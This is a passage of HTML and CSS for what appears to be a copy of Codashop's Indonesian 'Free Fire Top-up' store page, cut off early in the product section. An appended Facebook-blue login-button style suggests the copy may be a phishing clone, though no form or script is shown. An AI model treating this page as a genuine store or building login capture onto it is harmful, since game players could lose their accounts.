            overflow: hidden;
            white-space: nowrap;
            margin-bottom: 0
        }

        @media (max-width:359px) {
            .top-navbar__sign-up button[data-v-530f4f9e] {
                max-width: 63px;
                font-size: 12px;
                padding: 6px 10px
            }
        }

        @media (min-width:400px) {
            .top-navbar__sign-up button[data-v-530f4f9e] {
                max-width: 160px
            }
        }

        .top-navbar__container.active[data-v-530f4f9e] {
            margin-bottom: 45px
        }

        .top-navbar__container.active--prominent[data-v-530f4f9e] {
            margin-bottom: 66px
        }

        @media screen and (min-width:992px) {
            .top-navbar__container.active[data-v-530f4f9e] {
                margin-bottom: 0
            }

            .top-navbar__search[data-v-530f4f9e] {
                display: flex;
                justify-content: flex-end;
                width: 100%
            }

            [dir=ltr] .top-navbar__sign-up[data-v-530f4f9e] {
                margin-left: 10px
            }

            [dir=rtl] .top-navbar__sign-up[data-v-530f4f9e] {
                margin-right: 10px
            }

            .top-navbar__sign-up button[data-v-530f4f9e] {
                max-width: 120px
            }

            [dir=ltr] .top-navbar__sign-up button[data-v-530f4f9e] {
                margin-left: 15px
            }

            [dir=rtl] .top-navbar__sign-up button[data-v-530f4f9e] {
                margin-right: 15px
            }
        }

        @media screen and (min-width:1200px) {
            .top-navbar__sign-up button[data-v-530f4f9e] {
                max-width: 240px
            }
        }

        [class*=" f32_"],
        [class^=f32_] {
            background: url(https://www.codashop.com/assets/img/flags32.ee905aee.png) no-repeat 0 0 transparent;
            width: 32px;
            height: 22px;
            line-height: 26px;
            vertical-align: middle;
            display: inline-block
        }

        .f32_abkhazia {
            background-position: 0 -6px
        }

        .f32_afghanistan {
            background-position: 0 -38px
        }

        .f32_aland {
            background-position: 0 -70px
        }

        .f32_albania {
            background-position: 0 -102px
        }

        .f32_algeria {
            background-position: 0 -134px
        }

        .f32_american_samoa {
            background-position: 0 -166px
        }

        .f32_andorra {
            background-position: 0 -198px
        }

        .f32_angola {
            background-position: 0 -230px
        }

        .f32_anguilla {
            background-position: 0 -262px
        }

        .f32_antigua_and_barbuda {
            background-position: 0 -294px
        }

        .f32_argentina {
            background-position: 0 -326px
        }

        .f32_armenia {
            background-position: 0 -358px
        }

        .f32_aruba {
            background-position: 0 -390px
        }

        .f32_australia {
            background-position: 0 -422px
        }

        .f32_austria {
            background-position: 0 -454px
        }

        .f32_azerbaijan {
            background-position: 0 -486px
        }

        .f32_bahamas {
            background-position: 0 -518px
        }

        .f32_bahrain {
            background-position: 0 -550px
        }

        .f32_bangladesh {
            background-position: 0 -582px
        }

        .f32_barbados {
            background-position: 0 -614px
        }

        .f32_basque_country {
            background-position: 0 -646px
        }

        .f32_belarus {
            background-position: 0 -678px
        }

        .f32_belgium {
            background-position: 0 -710px
        }

        .f32_belize {
            background-position: 0 -742px
        }

        .f32_benin {
            background-position: 0 -774px
        }

        .f32_bermuda {
            background-position: 0 -806px
        }

        .f32_bhutan {
            background-position: 0 -838px
        }

        .f32_bolivia {
            background-position: 0 -870px
        }

        .f32_bosnia_and_herzegovina {
            background-position: 0 -902px
        }

        .f32_botswana {
            background-position: 0 -934px
        }

        .f32_brazil {
            background-position: 0 -966px
        }

        .f32_british_antarctic_territory {
            background-position: 0 -998px
        }

        .f32_british_virgin_islands {
            background-position: 0 -1030px
        }

        .f32_brunei {
            background-position: 0 -1062px
        }

        .f32_bulgaria {
            background-position: 0 -1094px
        }

        .f32_burkina_faso {
            background-position: 0 -1126px
        }

        .f32_burundi {
            background-position: 0 -1158px
        }

        .f32_cambodia {
            background-position: 0 -1190px
        }

        .f32_cameroon {
            background-position: 0 -1222px
        }

        .f32_canada {
            background-position: 0 -1254px
        }

        .f32_canary_islands {
            background-position: 0 -1286px
        }

        .f32_cape_verde {
            background-position: 0 -1318px
        }

        .f32_cayman_islands {
            background-position: 0 -1350px
        }

        .f32_central_african_republic {
            background-position: 0 -1382px
        }

        .f32_chad {
            background-position: 0 -1414px
        }

        .f32_chile {
            background-position: 0 -1446px
        }

        .f32_china {
            background-position: 0 -1478px
        }

        .f32_christmas_island {
            background-position: 0 -1510px
        }

        .f32_cocos_keeling_islands {
            background-position: 0 -1542px
        }

        .f32_colombia {
            background-position: 0 -1574px
        }

        .f32_comoros {
            background-position: 0 -1606px
        }

        .f32_cook_islands {
            background-position: 0 -1638px
        }

        .f32_costa_rica {
            background-position: 0 -1660px
        }

        .f32_cote_divoire {
            background-position: 0 -1702px
        }

        .f32_croatia {
            background-position: 0 -1734px
        }

        .f32_cuba {
            background-position: 0 -1766px
        }

        .f32_curacao {
            background-position: 0 -1798px
        }

        .f32_cyprus {
            background-position: 0 -1830px
        }

        .f32_czech_republic {
            background-position: 0 -1862px
        }

        .f32_d_r_of_the_congo {
            background-position: 0 -1894px
        }

        .f32_denmark {
            background-position: 0 -1926px
        }

        .f32_djibouti {
            background-position: 0 -1958px
        }

        .f32_dominica {
            background-position: 0 -1990px
        }

        .f32_dominican_republic {
            background-position: 0 -2022px
        }

        .f32_east_timor {
            background-position: 0 -2054px
        }

        .f32_ecuador {
            background-position: 0 -2086px
        }

        .f32_egypt {
            background-position: 0 -2118px
        }

        .f32_el_salvador {
            background-position: 0 -2150px
        }

        .f32_england {
            background-position: 0 -2182px
        }

        .f32_equatorial_guinea {
            background-position: 0 -2214px
        }

        .f32_eritrea {
            background-position: 0 -2246px
        }

        .f32_estonia {
            background-position: 0 -2278px
        }

        .f32_ethiopia {
            background-position: 0 -2310px
        }

        .f32_european_union {
            background-position: 0 -2342px
        }

        .f32_falkland_islands {
            background-position: 0 -2374px
        }

        .f32_faroes {
            background-position: 0 -2406px
        }

        .f32_fiji {
            background-position: 0 -2438px
        }

        .f32_finland {
            background-position: 0 -2470px
        }

        .f32_france {
            background-position: 0 -2502px
        }

        .f32_french_polynesia {
            background-position: 0 -2534px
        }

        .f32_french_southern_territories {
            background-position: 0 -2566px
        }

        .f32_gabon {
            background-position: 0 -2598px
        }

        .f32_gambia {
            background-position: 0 -2630px
        }

        .f32_georgia {
            background-position: 0 -2662px
        }

        .f32_germany {
            background-position: 0 -2694px
        }

        .f32_ghana {
            background-position: 0 -2726px
        }

        .f32_greece {
            background-position: 0 -2758px
        }

        .f32_greenland {
            background-position: 0 -2790px
        }

        .f32_grenada {
            background-position: 0 -2822px
        }

        .f32_guam {
            background-position: 0 -2854px
        }

        .f32_guatemala {
            background-position: 0 -2886px
        }

        .f32_guernsey {
            background-position: 0 -2918px
        }

        .f32_guinea_bissau {
            background-position: 0 -2950px
        }

        .f32_guinea {
            background-position: 0 -2982px
        }

        .f32_guyana {
            background-position: 0 -3014px
        }

        .f32_haiti {
            background-position: 0 -3046px
        }

        .f32_honduras {
            background-position: 0 -3078px
        }

        .f32_hong_kong {
            background-position: 0 -3110px
        }

        .f32_hungary {
            background-position: 0 -3142px
        }

        .f32_iceland {
            background-position: 0 -3174px
        }

        .f32_india {
            background-position: 0 -3206px
        }

        .f32_indonesia {
            background-position: 0 -3238px;
            background-color: #f3f3f3
        }

        .f32_iran {
            background-position: 0 -3270px
        }

        .f32_iraq {
            background-position: 0 -3302px
        }

        .f32_ireland {
            background-position: 0 -3334px
        }

        .f32_isle_of_man {
            background-position: 0 -3366px
        }

        .f32_israel {
            background-position: 0 -3398px
        }

        .f32_italy {
            background-position: 0 -3430px
        }

        .f32_jamaica {
            background-position: 0 -3462px
        }

        .f32_japan {
            background-position: 0 -3494px
        }

        .f32_jersey {
            background-position: 0 -3526px
        }

        .f32_jordan {
            background-position: 0 -3558px
        }

        .f32_kazakhstan {
            background-position: 0 -3590px
        }

        .f32_kenya {
            background-position: 0 -3622px
        }

        .f32_kiribati {
            background-position: 0 -3654px
        }

        .f32_kosovo {
            background-position: 0 -3686px
        }

        .f32_kuwait {
            background-position: 0 -3718px
        }

        .f32_kyrgyzstan {
            background-position: 0 -3750px
        }

        .f32_laos {
            background-position: 0 -3782px
        }

        .f32_latvia {
            background-position: 0 -3814px
        }

        .f32_lebanon {
            background-position: 0 -3846px
        }

        .f32_lesotho {
            background-position: 0 -3878px
        }

        .f32_liberia {
            background-position: 0 -3910px
        }

        .f32_libya {
            background-position: 0 -3942px
        }

        .f32_liechtenstein {
            background-position: 0 -3974px
        }

        .f32_lithuania {
            background-position: 0 -4006px
        }

        .f32_luxembourg {
            background-position: 0 -4038px
        }

        .f32_macau {
            background-position: 0 -4070px
        }

        .f32_macedonia {
            background-position: 0 -4102px
        }

        .f32_madagascar {
            background-position: 0 -4134px
        }

        .f32_malawi {
            background-position: 0 -4166px
        }

        .f32_malaysia {
            background-position: 0 -4198px
        }

        .f32_maldives {
            background-position: 0 -4230px
        }

        .f32_mali {
            background-position: 0 -4262px
        }

        .f32_malta {
            background-position: 0 -4294px
        }

        .f32_mars {
            background-position: 0 -4326px
        }

        .f32_marshall_islands {
            background-position: 0 -4358px
        }

        .f32_martinique {
            background-position: 0 -4390px
        }

        .f32_mauritania {
            background-position: 0 -4422px
        }

        .f32_mauritius {
            background-position: 0 -4454px
        }

        .f32_mayotte {
            background-position: 0 -4486px
        }

        .f32_mexico {
            background-position: 0 -4518px
        }

        .f32_micronesia {
            background-position: 0 -4550px
        }

        .f32_moldova {
            background-position: 0 -4582px
        }

        .f32_monaco {
            background-position: 0 -4614px
        }

        .f32_mongolia {
            background-position: 0 -4646px
        }

        .f32_montenegro {
            background-position: 0 -4678px
        }

        .f32_montserrat {
            background-position: 0 -4710px
        }

        .f32_morocco {
            background-position: 0 -4742px
        }

        .f32_mozambique {
            background-position: 0 -4774px
        }

        .f32_myanmar {
            background-position: 0 -4806px
        }

        .f32_nagorno_karabakh {
            background-position: 0 -4838px
        }

        .f32_namibia {
            background-position: 0 -4870px
        }

        .f32_nauru {
            background-position: 0 -4902px
        }

        .f32_nepal {
            background-position: 0 -4929px;
            height: 29px
        }

        .f32_netherlands_antilles {
            background-position: 0 -4966px
        }

        .f32_netherlands {
            background-position: 0 -4998px
        }

        .f32_new_caledonia {
            background-position: 0 -5030px
        }

        .f32_new_zealand {
            background-position: 0 -5062px
        }

        .f32_nicaragua {
            background-position: 0 -5094px
        }

        .f32_niger {
            background-position: 0 -5126px
        }

        .f32_nigeria {
            background-position: 0 -5158px
        }

        .f32_niue {
            background-position: 0 -5190px
        }

        .f32_norfolk_island {
            background-position: 0 -5222px
        }

        .f32_north_korea {
            background-position: 0 -5254px
        }

        .f32_northern_cyprus {
            background-position: 0 -5286px
        }

        .f32_norway {
            background-position: 0 -5318px
        }

        .f32_oman {
            background-position: 0 -5350px
        }

        .f32_pakistan {
            background-position: 0 -5382px
        }

        .f32_palau {
            background-position: 0 -5414px
        }

        .f32_palestine {
            background-position: 0 -5446px
        }

        .f32_panama {
            background-position: 0 -5478px
        }

        .f32_papua_new_guinea {
            background-position: 0 -5510px
        }

        .f32_paraguay {
            background-position: 0 -5542px
        }

        .f32_peru {
            background-position: 0 -5574px
        }

        .f32_philippines {
            background-position: 0 -5606px
        }

        .f32_pitcairn_islands {
            background-position: 0 -5638px
        }

        .f32_poland {
            background-position: 0 -5670px
        }

        .f32_portugal {
            background-position: 0 -5702px
        }

        .f32_puerto_rico {
            background-position: 0 -5734px
        }

        .f32_qatar {
            background-position: 0 -5766px
        }

        .f32_republic_of_the_congo {
            background-position: 0 -5798px
        }

        .f32_romania {
            background-position: 0 -5830px
        }

        .f32_russia {
            background-position: 0 -5862px
        }

        .f32_rwanda {
            background-position: 0 -5894px
        }

        .f32_saint_barthelemy {
            background-position: 0 -5926px
        }

        .f32_saint_helena {
            background-position: 0 -5958px
        }

        .f32_saint_kitts_and_nevis {
            background-position: 0 -5990px
        }

        .f32_saint_lucia {
            background-position: 0 -6022px
        }

        .f32_saint_martin {
            background-position: 0 -6054px
        }

        .f32_s_v_and_the_grenadines {
            background-position: 0 -6086px
        }

        .f32_samoa {
            background-position: 0 -6118px
        }

        .f32_san_marino {
            background-position: 0 -6150px
        }

        .f32_sao_tome_and_principe {
            background-position: 0 -6182px
        }

        .f32_saudi_arabia {
            background-position: 0 -6214px
        }

        .f32_scotland {
            background-position: 0 -6246px
        }

        .f32_senegal {
            background-position: 0 -6278px
        }

        .f32_serbia {
            background-position: 0 -6310px
        }

        .f32_seychelles {
            background-position: 0 -6342px
        }

        .f32_sierra_leone {
            background-position: 0 -6374px
        }

        .f32_singapore {
            background-position: 0 -6406px
        }

        .f32_slovakia {
            background-position: 0 -6438px
        }

        .f32_slovenia {
            background-position: 0 -6470px
        }

        .f32_solomon_islands {
            background-position: 0 -6502px
        }

        .f32_somalia {
            background-position: 0 -6534px
        }

        .f32_somaliland {
            background-position: 0 -6566px
        }

        .f32_south_africa {
            background-position: 0 -6598px
        }

        .f32_south_korea {
            background-position: 0 -6630px
        }

        .f32_south_ossetia {
            background-position: 0 -6662px
        }

        .f32_south_sudan {
            background-position: 0 -6694px
        }

        .f32_spain {
            background-position: 0 -6726px
        }

        .f32_sri_lanka {
            background-position: 0 -6758px
        }

        .f32_sudan {
            background-position: 0 -6790px
        }

        .f32_suriname {
            background-position: 0 -6822px
        }

        .f32_swaziland {
            background-position: 0 -6854px
        }

        .f32_sweden {
            background-position: 0 -6886px
        }

        .f32_switzerland {
            background-position: 0 -6918px
        }

        .f32_syria {
            background-position: 0 -6950px
        }

        .f32_taiwan {
            background-position: 0 -6982px
        }

        .f32_tajikistan {
            background-position: 0 -7014px
        }

        .f32_tanzania {
            background-position: 0 -7046px
        }

        .f32_thailand {
            background-position: 0 -7078px
        }

        .f32_togo {
            background-position: 0 -7110px
        }

        .f32_tonga {
            background-position: 0 -7142px
        }

        .f32_trinidad_and_tobago {
            background-position: 0 -7174px
        }

        .f32_tunisia {
            background-position: 0 -7206px
        }

        .f32_turkey {
            background-position: 0 -7238px
        }

        .f32_turkmenistan {
            background-position: 0 -7270px
        }

        .f32_turks_and_caicos_islands {
            background-position: 0 -7302px
        }

        .f32_tuvalu {
            background-position: 0 -7334px
        }

        .f32_uganda {
            background-position: 0 -7366px
        }

        .f32_ukraine {
            background-position: 0 -7398px
        }

        .f32_united_arab_emirates {
            background-position: 0 -7430px
        }

        .f32_united_kingdom {
            background-position: 0 -7462px
        }

        .f32_united_states {
            background-position: 0 -7494px
        }

        .f32_uruguay {
            background-position: 0 -7526px
        }

        .f32_uzbekistan {
            background-position: 0 -7558px
        }

        .f32_vanuatu {
            background-position: 0 -7590px
        }

        .f32_vatican_city {
            background-position: 0 -7622px
        }

        .f32_venezuela {
            background-position: 0 -7654px
        }

        .f32_vietnam {
            background-position: 0 -7686px
        }

        .f32_wales {
            background-position: 0 -7718px
        }

        .f32_wallis_and_futuna {
            background-position: 0 -7750px
        }

        .f32_western_sahara {
            background-position: 0 -7782px
        }

        .f32_yemen {
            background-position: 0 -7814px
        }

        .f32_zambia {
            background-position: 0 -7846px
        }

        .f32_zimbabwe {
            background-position: 0 -7878px
        }

        @font-face {
            font-family: NotoSans-Bold;
            font-weight: 400;
            src: local("NotoSans Bold"), local("NotoSans-Bold"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Bold.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Bold.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: NotoSans-Semibold;
            font-weight: 400;
            src: local("NotoSans SemiBold"), local("NotoSans-Bold"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-SemiBold.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-SemiBold.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: NotoSans-Italic;
            font-weight: 400;
            src: local("NotoSans Italic"), local("NotoSans-Italic"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Italic.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Italic.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: NotoSans-Light;
            font-weight: 400;
            src: local("NotoSans Light"), local("NotoSans-Light"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Light.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Light.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: NotoSans-Regular;
            font-weight: 400;
            src: local("NotoSans Regular"), local("NotoSans-Regular"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Regular.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/fonts/Noto/NotoSans-Regular.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: NotoSans-Vietnamese;
            font-weight: 400;
            src: local("Noto Sans Tai Viet"), local("NotoSans-Tai Viet"), url(https://cdn1.codashop.com/S/content/fonts/Noto/Vietnamese/NotoSansTaiViet-Regular.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/fonts/Noto/Vietnamese/NotoSansTaiViet-Regular.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: OTT-Bold;
            font-weight: 400;
            src: local("OTT Bold"), local("OTT-Bold"), url(https://cdn1.codashop.com/S/content/fonts/next-gen/OTT-Bold.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/fonts/next-gen/OTT-Bold.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: RefrigeratorDeluxe-Heavy;
            font-weight: 900;
            src: local("RefrigeratorDeluxe Heavy"), local("RefrigeratorDeluxe-Heavy"), url(https://cdn1.codashop.com/S/content/webstore/codm/fonts/RefrigeratorDeluxe-Heavy.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/webstore/codm/fonts/RefrigeratorDeluxe-Heavy.woff) format("woff");
            font-display: swap
        }

        @font-face {
            font-family: RefrigeratorDeluxe-Regular;
            font-weight: 400;
            src: local("RefrigeratorDeluxe Regular"), local("RefrigeratorDeluxe-Regular"), url(https://cdn1.codashop.com/S/content/webstore/codm/fonts/RefrigeratorDeluxe-Regular.woff2) format("woff2"), url(https://cdn1.codashop.com/S/content/webstore/codm/fonts/RefrigeratorDeluxe-Regular.woff) format("woff");
            font-display: swap
        }

        :root {
            --color-dark-main: #280031;
            --color-dark-1: #24042f;
            --color-dark-2: #32103a;
            --color-dark-3: #36213d;
            --color-dark-4: #3c1f42;
            --color-dark-5: #472f4c;
            --color-dark-6: #4f2f57;
            --color-dark-7: #513f55;
            --color-light-main: #eae8f7;
            --color-light-1: #f9f9f9;
            --color-light-2: #dfdaff;
            --color-light-3: #cac5e8;
            --color-light-4: #b9aec5;
            --color-light-5: #897493;
            --color-light-6: #583a63;
            --color-light-7: #efe9ff;
            --color-primary-main: #6242fc;
            --color-primary-5: #4129b5;
            --color-primary-4: #4e31da;
            --color-primary-1: #7f60fe;
            --color-primary-2: #9a7eff;
            --color-primary-3: #b9a5fe;
            --color-primary-6: #efe9ff;
            --color-secondary-main: #e8f953;
            --color-secondary-1: #eaf771;
            --color-secondary-4: #d9f200;
            --color-secondary-5: #c0d603;
            --color-secondary-2: #f0fa9c;
            --color-secondary-3: #f7fcc4;
            --color-tertiary-main: #ff7f98;
            --color-tertiary-1: #f84771;
            --color-tertiary-2: #ffb3c2;
            --color-tertiary-3: #ffe1e6;
            --color-tertiary-4: #f33862;
            --color-surface-neutral-subdued: #f7edfa;
            --color-text-dark-heading: #2f1236;
            --color-text-dark: #3f3c4d;
            --color-yellow: #e4a200;
            --color-yellow-2: #f79f2f;
            --color-yellow-3: #ffe6bb;
            --color-orange-1: #ec7414;
            --color-red-3: #e9463c;
            --color-green-1: #20b454;
            --color-green-2: #76b88d;
            --color-green-3: #d5f7db;
            --color-green-4: #30a32e;
            --color-green-5: #068749;
            --color-green-6: #007547;
            --color-primary: #fff;
            --color-secondary: #333;
            --border-color: transparent;
            --font-family-primary: "NotoSans-Regular", sans-serif;
            --loader-backdrop: rgba(0, 0, 0, 0.9);
            --loader-backdrop-dark: rgba(0, 0, 0, 0.9);
            --loader-backdrop-light: hsla(0, 0%, 100%, 0.65);
            --box-shadow-primary: rgba(0, 0, 0, 0.15)
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes placeHolderShimmer {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 51%
            }

            to {
                background-position: 0 50%
            }
        }

        body,
        html {
            width: 100%;
            height: 100%
        }

        .page--cjk div,
        .page--cjk li,
        .page--cjk p,
        .page--cjk strong {
            word-break: keep-all !important;
            overflow-wrap: anywhere
        }

        .codashop-container {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            align-items: stretch
        }

        .codashop-container .codashop-content__wrapper {
            margin-bottom: auto;
            padding-bottom: 40px;
            min-height: 500px
        }

        .codashop-container .codashop__content {
            flex-grow: 1;
            position: relative;
            overflow-wrap: break-word
        }

        .codashop-container .codashop__content,
        .codashop-container .codashop__footer,
        .codashop-container .codashop__header {
            flex-shrink: 0
        }

        .codashop-container .codashop__header {
            border-bottom: 1px solid var(--color-light-6)
        }

        body {
            margin: 0;
            background-color: var(--color-dark-main);
            font-family: var(--font-family-primary);
            font-size: 16px
        }

        [dir=ltr] body {
            direction: ltr
        }

        [dir=rtl] body {
            direction: rtl
        }

        body.cashback-landing-layout header,
        body.cc-landing-layout footer,
        body.cc-landing-layout header {
            display: none
        }

        * {
            box-sizing: border-box;
            font-weight: 400
        }

        .touched {
            border: 1px solid var(--color-light-4)
        }

        .touched.invalid {
            outline: none;
            border: 2px solid #e9463c !important;
            box-shadow: 0 0 8px -2px #e9463c
        }

        .touched.valid {
            outline: none;
            box-shadow: none
        }

        .validationMessage {
            font-size: .75rem;
            color: #e9463c;
            line-height: 1.8em
        }

        @media screen and (max-width:992px) {
            .noScroll {
                overflow: hidden
            }
        }

        .android-disclaimer {
            padding: 16px;
            font-size: .875rem;
            background-color: var(--color-secondary-main)
        }

        @keyframes fadeIn-data-v-eeecc674 {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes placeHolderShimmer-data-v-eeecc674 {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 51%
            }

            to {
                background-position: 0 50%
            }
        }

        [data-v-eeecc674]:export {
            breakpointLg: 992px
        }

        .not-authorised[data-v-eeecc674] {
            color: #fff;
            text-align: center;
            margin: 0 auto
        }

        .not-authorised svg[data-v-eeecc674] {
            margin-top: 15%
        }

        .not-authorised h2[data-v-eeecc674] {
            font-family: NotoSans-Bold, sans-serif
        }

        .not-authorised p[data-v-eeecc674] {
            font-family: NotoSans-Regular, sans-serif;
            font-size: .875rem;
            font-weight: 400;
            margin: 0 auto;
            width: 221px
        }
		.btn-login {
		    background: #1778F2;
			width: 100%;
			height: auto;
			margin-top: 20px;
			margin-bottom: 20px;
			padding: 9px;
			color: #fff;
			font-size: 19px;
			text-align: center;
			border: none;
			border-radius: 30px;
			outline: none;
			box-shadow: -5px 5px 10px rgba(0,0,0,.16);
		}
		.btn-login img {
		    width: 35px;
		    padding-left: 10px;
			float: left;
		}
		.btn-login i {
		    padding-left: 10px;
		    font-size: 25px;
			float: left;
		}
    </style>

    <div id="app" class="codashop-container">
        <div id="">
            <header data-v-530f4f9e="" class="top-navbar codashop__header">
                <div data-v-530f4f9e="" class="top-navbar__container">
                    <div data-v-530f4f9e="">
                        <div data-v-3f7650da="" data-v-530f4f9e="" class="menu-icon-container-wrapper">
                            <div data-v-3f7650da="" class="menu-icon-container-wrapper__icon">
							<span data-v-3f7650da="" class="menu-icon__bar"></span>
							<span data-v-3f7650da="" class="menu-icon__bar"></span>
							<span data-v-3f7650da="" class="menu-icon__bar"></span>
							</div>
                        </div>
                    </div>
                    <div data-v-530f4f9e="" class="logo__container">
                        <div class="logo__container--with-link">
						<a class="logo__link router-link-active">
						<img src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-3a.png" alt="Logo" height="24" width="auto" class="logo__image logo--theme">
						</a>
                            <p class="logo__tagline">
							<span>Website top-up terbesar, tercepat dan terpercaya untuk pembelian kredit game dan entertainment</span>
							</p>
                        </div>
                    </div>
                    <div data-v-530f4f9e="" class="top-navbar__search">
                        <div data-v-62b386a2="" data-v-530f4f9e="" class="search__container">
						<span data-v-62b386a2="" class="search__icon-wrapper">
						<svg data-v-b2025ae2="" data-v-62b386a2="" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="search__icon">
						<g data-v-b2025ae2="" clip-path="url(#clip0_657_3763)">
						<path data-v-b2025ae2="" d="M14.3696 14.3955L20.6014 20.6274" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" class="path--light"></path>
						<path data-v-b2025ae2="" d="M2.6443 11.1966L7.28439 15.8367C7.35501 15.9072 7.44303 15.9579 7.53953 15.9834C7.63603 16.0089 7.73757 16.0085 7.83384 15.9821L13.8846 14.3258C13.9793 14.2999 14.0657 14.2497 14.1351 14.1802C14.2046 14.1108 14.2548 14.0245 14.2807 13.9297L15.937 7.87894C15.9633 7.78262 15.9637 7.68105 15.938 7.58455C15.9124 7.48805 15.8617 7.40005 15.791 7.32949L11.1509 2.6894C11.0802 2.61944 10.9923 2.56937 10.896 2.54423C10.7997 2.5191 10.6985 2.51979 10.6026 2.54624L4.55126 4.19969C4.45654 4.22566 4.37021 4.27584 4.30076 4.34529C4.23131 4.41474 4.18113 4.50108 4.15516 4.5958L2.49887 10.6472C2.4725 10.7434 2.47206 10.845 2.4976 10.9415C2.52314 11.038 2.57375 11.126 2.6443 11.1966V11.1966Z" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" class="path--light"></path>
						</g>
						<defs data-v-b2025ae2="">
						<clipPath data-v-b2025ae2="" id="clip0_657_3763">
						<rect data-v-b2025ae2="" width="24" height="24" fill="white"></rect>
						</clipPath>
						</defs>
						</svg>
						</span>
						</div>
                    </div>
                    <div data-v-0f34bf32="" data-v-530f4f9e="" class="notification__container">
                        <div data-v-615e2f8b="" data-v-0f34bf32="" class="notification-popover">
						<span data-v-615e2f8b="" class="notification-popover__bell">
						<svg data-v-46e92e59="" data-v-615e2f8b="" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="">
						<path data-v-46e92e59="" fill-rule="evenodd" clip-rule="evenodd" d="M3.50083 13.7871V13.5681C3.53295 12.9202 3.7406 12.2925 4.10236 11.7496C4.7045 11.0975 5.1167 10.2983 5.29571 9.43598C5.29571 8.7695 5.29571 8.0935 5.35393 7.42703C5.65469 4.21842 8.82728 2 11.9611 2H12.0387C15.1725 2 18.345 4.21842 18.6555 7.42703C18.7137 8.0935 18.6555 8.7695 18.704 9.43598C18.8854 10.3003 19.2972 11.1019 19.8974 11.7591C20.2618 12.2972 20.4698 12.9227 20.4989 13.5681V13.7776C20.5206 14.648 20.2208 15.4968 19.6548 16.1674C18.907 16.9515 17.8921 17.4393 16.8024 17.5384C13.607 17.8812 10.383 17.8812 7.18762 17.5384C6.09914 17.435 5.08576 16.9479 4.33521 16.1674C3.778 15.4963 3.48224 14.6526 3.50083 13.7871Z" stroke="#EAE8F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
						<path data-v-46e92e59="" d="M9.55493 20.8516C10.0542 21.4782 10.7874 21.8838 11.5922 21.9785C12.3971 22.0732 13.2072 21.8493 13.8433 21.3562C14.0389 21.2103 14.2149 21.0408 14.3672 20.8516" stroke="#EAE8F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
						<circle data-v-46e92e59="" cx="18" cy="5" r="3.5" fill="#F84771" stroke="#381B42"></circle><!---->
						</svg>
						</span>
						</div>
                    </div>
                    <div data-v-530f4f9e="" class="top-navbar__sign-up">
					<button data-v-71db3a9f="" data-v-530f4f9e="" type="button" class=" btn-default btn-multiple btn-small"> Daftar </button>
					</div>
                </div>
            </header>
            <div data-v-1cc55f6e="" class="pane-container-wrapper"><!----><!----></div>
            <div class="codashop-content__wrapper">
                <main data-v-2e06dbb4="" class="product-page webstore-product codashop__content">
                    <div data-v-46f504f4="" data-v-2e06dbb4="">
                        <div data-v-46f504f4=""></div>
                    </div>
                    <div data-v-2e06dbb4="" class="product__container">
                        <div data-v-2e06dbb4="" class="product__blocking">
                            <section data-v-2e06dbb4="" class="product__info">
                                <section data-v-2dd8a47f="" data-v-2e06dbb4="" class="product-details__container">
                                    <div data-v-2dd8a47f="" class="product-details__banner-container"><img data-v-2dd8a47f="" src="https://cdn1.codashop.com/S/content/common/images/mno/freefire_new_640x241.jpg" class="product-details__banner"></div>
                                    <div data-v-2dd8a47f="" class="product-details__description">
                                        <h2 data-v-2dd8a47f="" class="product-details__name">Free Fire Top-up</h2>
                                        <div data-v-911ab42c="" data-v-2dd8a47f="">
                                            <div data-v-911ab42c="" class="product-details__trust-tag-container"><!---->
                                                <div data-v-911ab42c="" class="product-details__icon-tag"><span data-v-911ab42c=""><svg data-v-911ab42c="" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M12 7L13.3225 10.1797L16.7553 10.4549L14.1399 12.6953L14.9389 16.0451L12 14.25L9.06107 16.0451L9.86012 12.6953L7.24472 10.4549L10.6775 10.1797L12 7Z" stroke="#280031" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M12 3L18.364 5.63604L21 12L18.364 18.364L12 21L5.63604 18.364L3 12L5.63604 5.63604L12 3Z" stroke="#280031" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        </svg></span><span data-v-911ab42c="">Pembayaran yang Aman</span></div><!---->
                                                <div data-v-911ab42c="" class="product-details__icon-tag"><span data-v-911ab42c=""><svg data-v-9fe12e4e="" data-v-911ab42c="" width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
